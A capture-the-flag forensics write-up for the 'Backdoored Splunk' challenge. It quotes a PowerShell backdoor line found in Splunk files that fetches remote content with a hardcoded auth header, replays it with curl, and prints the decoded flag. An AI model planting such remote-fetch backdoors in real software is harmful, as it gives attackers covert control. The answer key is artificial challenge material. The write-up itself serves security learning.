# Backdoored Splunk (forensics, 637 solves, 50 points)

## Introduction

<p align="left">
  <img height=400 img src=./readme_assets/splunk-challenge.PNG/>
</p>

## Solution

You are given a file and a url. When you go to the website you get an error.

<p align="left">
  <img height=200 img src=./readme_assets/splunk-error.PNG/>
</p>

Googling the error you find that we can use curl to fix the error and access the site. [reqbin](https://reqbin.com/req/curl/h4rnefmw/post-json-with-bearer-token-authorization-header). 

First we have to `grep` the splink files to find the info we need. Grepping `authorization` you found `$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$32613 -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content`

Use this info to curl the website. `curl http://chal.ctf.games:32613 -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="`

You receive `ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==` in return. Decode from base64 to got the flag.

## Flag

**`flag{60bb3bfaf703e0fa36730ab70e115bd7}`**

## Tools


